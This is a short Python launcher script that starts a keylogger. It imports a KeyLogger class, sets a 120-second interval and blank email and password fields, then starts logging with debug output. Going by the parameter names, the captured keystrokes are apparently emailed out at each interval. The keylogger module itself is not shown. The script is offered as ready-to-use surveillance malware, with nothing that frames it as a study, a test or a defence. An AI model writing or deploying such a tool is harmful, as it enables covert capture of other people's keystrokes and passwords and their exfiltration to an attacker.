from keylogger import KeyLogger

if __name__ == '__main__':

    # Set Up Variables
    timer = 120
    your_email = ''
    email_pass = ''

    keylogger = KeyLogger(interval=timer, email=your_email, password=email_pass)
    keylogger.start(print_debug_logs=True)